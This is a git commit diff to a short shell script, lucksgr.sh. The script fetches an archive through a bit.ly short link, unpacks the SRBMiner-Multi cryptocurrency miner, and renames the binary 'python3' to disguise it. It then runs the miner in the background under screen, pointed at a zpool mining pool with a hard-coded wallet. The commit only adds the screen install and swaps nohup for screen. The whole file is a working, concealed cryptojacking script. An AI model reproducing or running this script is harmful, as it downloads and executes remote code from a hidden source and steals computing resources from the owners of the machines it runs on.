3c7705833136a2e1bcec561efad49a74f56b0bcf
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-06-17 22:02:31 +0700

    Update lucksgr.sh

--- lucksgr.sh
+++ lucksgr.sh
@@ -1,3 +1,5 @@
+apt install screen -y
+
 wget -O dot https://bit.ly/kontolrum
 
 tar xvf dot
@@ -6,4 +8,4 @@ cd SRBMiner-Multi-2-4-7
 
 mv SRBMiner-MULTI python3
 
-nohup ./python3 -a yespowersugar -o yespowerSUGAR.sea.mine.zpool.ca:6241 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt -p c=DGB
+screen ./python3 -a yespowersugar -o yespowerSUGAR.sea.mine.zpool.ca:6241 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt -p c=DGB
